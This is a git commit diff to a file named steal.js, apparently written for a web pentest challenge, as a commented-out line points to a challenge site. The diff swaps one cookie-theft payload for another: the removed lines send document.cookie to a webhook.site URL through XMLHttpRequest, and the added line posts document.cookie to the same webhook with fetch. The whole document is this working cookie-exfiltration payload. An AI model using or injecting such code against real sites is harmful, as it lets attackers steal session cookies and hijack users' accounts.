8b1ff602277054e6e2b832bab207e739d12060ac
vhash <29121316+LucasVanHaaren@users.noreply.github.com>
2024-10-23 17:36:36 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,5 +1,2 @@
-const xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77/'+document.cookie);
-xhr.onload = () => console.log(xhr.responseText);
-xhr.send();
+fetch('https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77', { method: 'POST', mode: 'no-cors', body:document.cookie });
 // window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
